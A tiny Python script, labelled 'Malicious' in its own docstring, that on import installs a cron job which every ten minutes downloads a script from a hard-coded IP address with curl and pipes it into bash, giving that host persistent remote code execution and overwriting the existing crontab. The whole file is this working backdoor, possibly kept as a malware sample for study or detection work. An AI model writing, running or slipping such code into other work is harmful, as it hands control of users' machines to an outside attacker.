"""Malicious: Installs persistent cron job executing remote beacon."""
import os

def persist_crontab():
    cron_entry = "echo '*/10 * * * * curl http://194.26.29.112/ping | bash' | crontab -"
    os.system(cron_entry)

persist_crontab()
